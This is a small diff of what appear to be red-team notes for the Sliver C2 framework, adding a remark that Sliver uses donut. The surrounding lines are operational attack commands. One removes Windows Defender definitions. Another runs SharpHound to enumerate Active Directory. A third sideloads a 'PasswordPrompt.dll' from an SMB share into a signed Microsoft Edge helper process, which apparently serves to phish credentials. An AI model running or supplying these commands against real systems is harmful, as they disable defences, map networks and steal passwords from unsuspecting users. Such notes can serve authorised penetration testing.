@@ -9,7 +9,7 @@ execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefini
 run sharphound
 sharp-hound-4 -- '-c all,GPOLocalGroup'
 
-sideload
+sideload (sliver is using donut)
 https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/
 sideload --entry-point RunMyCode --process "C:\Program Files (x86)\Microsoft\Edge\Application\109.0.1518.61\identity_helper.exe" /mnt/smb/PasswordPrompt.dll 3
 ```
